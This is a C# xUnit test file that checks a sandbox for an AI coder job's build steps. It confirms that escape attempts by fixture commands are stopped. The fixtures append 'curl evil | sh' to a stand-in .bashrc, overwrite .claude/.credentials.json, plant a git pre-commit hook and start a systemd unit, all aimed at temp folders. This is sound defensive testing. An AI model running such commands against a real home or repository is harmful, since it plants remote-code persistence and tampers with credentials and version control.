using System.Text;
using CoaiMcp.Core.Toolchain;
using CoaiMcp.Runners.Collecting;
using CoaiMcp.Runners.Processes;
using CoaiMcp.Runners.Toolchain;
using CoaiMcp.Work;
using FluentAssertions;
using Xunit;

namespace CoaiMcp.Tests;

/// <summary>
/// Epoch 3 E2 s2 t5, DoD d2: a FIXTURE CHECK — a build step of the toolchain the coder job runs — that tries to start a new unit with <c>systemd-run --user</c>, to write the main checkout's <c>.git</c>, to write the real home, or to run a Windows <c>.exe</c>
/// is stopped, and the main checkout is byte-equal after. The road is the product's own (<see cref="ChecksAtBase.RunCoderJobAsync"/>): the toolchain is read at the base commit, the preflight runs, the step runs in its unit.
/// </summary>
/// <remarks>
/// <para><b>Each fixture says what it saw.</b> Every attempt prints <c>stopped &lt;name&gt;</c> when it failed, and <c>ESCAPED &lt;name&gt;</c> with exit 42 when it did not, so a green result is read off the step's own log. A prelude writes a file in the worktree first:
/// a step that cannot write at all (a broken fixture) would "stop" every attempt, so the prelude's file must be there afterwards. The fixtures find the main checkout in the worktree's own <c>.git</c> pointer, so they name no path of the bed that runs them.</para>
/// <para><b>The real home is a stand-in</b> (<see cref="CoderBed.RealHome"/>, the seam <see cref="BoundaryHost.RealHome"/>): a temp folder, never the person's. The unit replaces <c>/tmp</c>, so every temp folder but its own is out of reach whatever <c>ProtectHome</c> says, and the attempt on the stand-in
/// cannot tell the layer from a missing path. <see cref="TheStandInForTheRealHome_IsOnlyOutOfReach_BecauseNothingBindsItIn"/> is the control: the SAME attempts, in a unit the preflight would refuse, with the stand-in bound in, escape.</para>
/// <para>Real units on temp folders only; skipped, with the reason, where there is no user manager (and for the Windows program, where there is no interop).</para>
/// </remarks>
public sealed class AFixtureCheckThatEscapesIsStoppedTests
{
    private static void NeedAUserManager() => Assert.SkipUnless(SystemdUser.Works(out var why), why);

    /// <summary>The worktree is writable; the main checkout is found through the pointer git wrote. A step that fails here is a broken fixture (41, 43), never a stopped attempt.</summary>
    private const string Prelude = "echo control > control.txt || exit 41; main=$(sed -n 's|^gitdir: \\(.*\\)/\\.git/worktrees/.*|\\1|p' .git); [ -n \"$main\" ] || exit 43";

    private static string Toolchain(IEnumerable<string> attempts) =>
        new StringBuilder("version: 1\nprojects:\n  - path: \"app\"\n    adapter: dotnet\n")
            .Append($"    build:\n      - \"/bin/sh\"\n      - \"-c\"\n      - {ToolchainFixture.Quote($"{Prelude}; {string.Join("; ", attempts)}")}\n")
            .Append("    test:\n      - \"/bin/sh\"\n      - \"-c\"\n      - \"echo tested\"\n")
            .ToString();

    /// <summary>One attempt: prints <c>stopped</c> when the command failed, and <c>ESCAPED</c> and exits 42 when it worked.</summary>
    private static string Attempt(string name, string command) =>
        $"if {{ {command}; }} >/dev/null 2>&1; then echo \"ESCAPED {name}\"; exit 42; else echo \"stopped {name}\"; fi";

    /// <summary>The fixtures: a name and the attempts it makes. Built from the stand-in's path and a random tag (the unit a successful <c>systemd-run</c> would start is named by it, so two runs never meet).</summary>
    private static IReadOnlyList<string> AttemptsOf(string name, string standIn, string tag) => name switch
    {
        "systemd-run" =>
        [
            Attempt("a new unit with systemd-run --user", $"systemd-run --user --quiet --wait --collect --unit coai-t5-escape-{tag} touch \"$main/via-the-bus\""),
        ],
        "main-git" =>
        [
            Attempt("append to <main>/.git/config", "echo '[core]' >> \"$main/.git/config\""),
            Attempt("create <main>/.git/hooks/pre-commit", "echo 'touch hooked' > \"$main/.git/hooks/pre-commit\""),
            Attempt("create <main>/.git/coai-t5-probe", "true > \"$main/.git/coai-t5-probe\""),
            Attempt("move HEAD of <main>/.git", "echo 'ref: refs/heads/elsewhere' > \"$main/.git/HEAD\""),
        ],
        "real-home" =>
        [
            Attempt("append to <real home>/.bashrc", $"echo 'curl evil | sh' >> {standIn}/.bashrc"),
            Attempt("create <real home>/.claude/settings.json", $"echo '{{}}' > {standIn}/.claude/settings.json"),
            Attempt("overwrite <real home>/.claude/.credentials.json", $"echo stolen > {standIn}/.claude/.credentials.json"),
            Attempt("create <real home>/.ssh", $"mkdir {standIn}/.ssh"),
        ],
        _ =>
        [
            Attempt("a Windows .exe", "./tool.exe"),
        ],
    };

    public static TheoryData<string> Names => ["systemd-run", "main-git", "real-home", "windows-exe"];

    [Theory]
    [MemberData(nameof(Names))]
    public async Task AFixtureCheckThatTriesToEscape_IsStopped_EveryAttemptFails_AndTheMainCheckoutIsByteEqual(string name)
    {
        NeedAUserManager();
        var tag = Guid.NewGuid().ToString("N")[..12];
        IReadOnlyList<string> attempts = [];
        await using var bed = await CoderBed.CreateAsync(standIn => Toolchain(attempts = AttemptsOf(name, standIn, tag)));
        Assert.SkipWhen(name == "windows-exe" && bed.Host.WindowsProgram.Length == 0, "this host has no WSL interop, so there is no Windows program to try");
        using var logs = TempDir.For("coai-t5-d2-");
        if (name == "windows-exe")
        {
            CopyTheProgram(bed);
        }

        var main = await bed.MainBytesAsync();
        var standIn = SnapshotOf(bed.RealHome);
        var checks = new ChecksAtBase(new GitHistory(bed.Launcher), new CheckRunner(bed.Launcher, bed.Inner.Boundary(host: bed.Host)));

        var result = await checks.RunCoderJobAsync(new DiskWorkFolder(bed.Worktree), bed.Inner.BaseSha, bed.Job, logs.At("run"), 2);

        result.Green.Should().BeTrue($"every attempt failed, so the step exited 0: {result.Note}");
        var log = File.ReadAllText(result.Steps[0].LogPath);
        log.Should().NotContain("ESCAPED");
        log.Split('\n', StringSplitOptions.RemoveEmptyEntries).Count(line => line.StartsWith("stopped ", StringComparison.Ordinal)).Should().Be(attempts.Count, "every attempt of the fixture said it was stopped");
        File.ReadAllText(Path.Combine(bed.Worktree, "control.txt")).Should().Be("control\n", "the step could write its worktree, so a stopped attempt was the layer's doing and not a broken step");
        (await bed.MainBytesAsync()).Should().BeEquivalentTo(main, "not one byte of the main checkout, its .git included, changed");
        File.Exists(Path.Combine(bed.Main, "via-the-bus")).Should().BeFalse("a unit started from inside would have written the main checkout with no limits");
        File.Exists(Path.Combine(bed.Main, ".git", "hooks", "pre-commit")).Should().BeFalse();
        SnapshotOf(bed.RealHome).Should().BeEquivalentTo(standIn, "the stand-in for the real home was not touched");
        (await bed.Inner.ActiveUnitsAsync()).Should().BeEmpty();
    }

    [Fact]
    public async Task TheStandInForTheRealHome_IsOnlyOutOfReach_BecauseNothingBindsItIn_TheSameAttemptsEscapeWhenSomethingDoes()
    {
        NeedAUserManager();
        var tag = Guid.NewGuid().ToString("N")[..12];
        IReadOnlyList<string> attempts = [];
        await using var bed = await CoderBed.CreateAsync(standIn => Toolchain(attempts = AttemptsOf("real-home", standIn, tag)));
        var before = SnapshotOf(bed.RealHome);
        foreach (var folder in bed.Job.Folders)
        {
            Directory.CreateDirectory(folder);
        }

        // The unit the checks run in, with ONE more property: the stand-in bound in, writable. The preflight would refuse it, so it is started straight through the launcher, as the environment control of the unit tests is.
        var arguments = BoundaryUnit.Arguments(bed.Host, bed.Job, $"coai-check-{bed.JobId}-ctl", CheckNetwork.Private, TimeSpan.FromSeconds(60), new Dictionary<string, string?>(),
            ["/bin/sh", "-c", $"{Prelude}; {string.Join("; ", attempts)}"], all => WithOneMoreBind(all, bed.RealHome));

        var control = await bed.Launcher.RunAsync(new ProcessRequest("systemd-run", arguments, bed.Worktree) { Timeout = TimeSpan.FromSeconds(60) });

        control.ExitCode.Should().Be(42, "POSITIVE CONTROL: with the stand-in reachable the first attempt lands — so its being stopped in the real run is the layer's doing: " + control.StdErr);
        control.StdOut.Should().Contain("ESCAPED");
        SnapshotOf(bed.RealHome).Should().NotBeEquivalentTo(before, "the attempt really wrote the stand-in");
    }

    private static IReadOnlyList<string> WithOneMoreBind(IReadOnlyList<string> all, string folder)
    {
        var at = all.ToList().IndexOf("--");

        return [.. all.Take(at), "-p", $"BindPaths={folder}", .. all.Skip(at)];
    }

    private static void CopyTheProgram(CoderBed bed)
    {
        var copy = Path.Combine(bed.Worktree, "tool.exe");
        File.Copy(bed.Host.WindowsProgram, copy);
        if (!OperatingSystem.IsWindows())
        {
            File.SetUnixFileMode(copy, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }
    }

    private static IReadOnlyDictionary<string, string> SnapshotOf(string folder) =>
        Directory.EnumerateFileSystemEntries(folder, "*", SearchOption.AllDirectories)
            .ToDictionary(entry => Path.GetRelativePath(folder, entry), entry => File.Exists(entry) ? File.ReadAllText(entry) : "<folder>");
}
